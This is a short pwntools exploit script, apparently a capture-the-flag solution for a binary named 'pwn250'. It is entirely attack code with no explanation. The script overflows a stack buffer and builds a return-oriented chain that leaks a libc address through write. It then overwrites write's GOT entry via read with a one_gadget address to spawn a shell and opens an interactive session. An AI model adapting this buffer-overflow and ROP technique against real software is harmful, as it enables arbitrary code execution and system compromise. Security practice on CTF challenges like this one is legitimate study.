from pwn import *

target = "./pwn250"

p = process(target)
e = ELF(target)

# pop rdi, pop rsi, pop rdx, ret
magic_addr = 0x40056a

payload = "A" * 0x80
payload += "B" * 8
payload += p64(magic_addr)
payload += p64(1)
payload += p64(e.got['__libc_start_main'])
payload += p64(8)
payload += p64(e.plt['write'])
payload += p64(magic_addr)
payload += p64(0)
payload += p64(e.got['write'])
payload += p64(8)
payload += p64(e.plt['read'])
payload += p64(e.plt['write'])

p.send(payload)

recv = u64(p.recv().ljust(8, "\x00"))
libc_base = recv - 0x20740
one_shot = libc_base + 0x4526A

log.info("libc base : {}".format(hex(libc_base)))
log.info("one_shot  : {}".format(hex(one_shot)))

p.send(p64(one_shot))

p.interactive()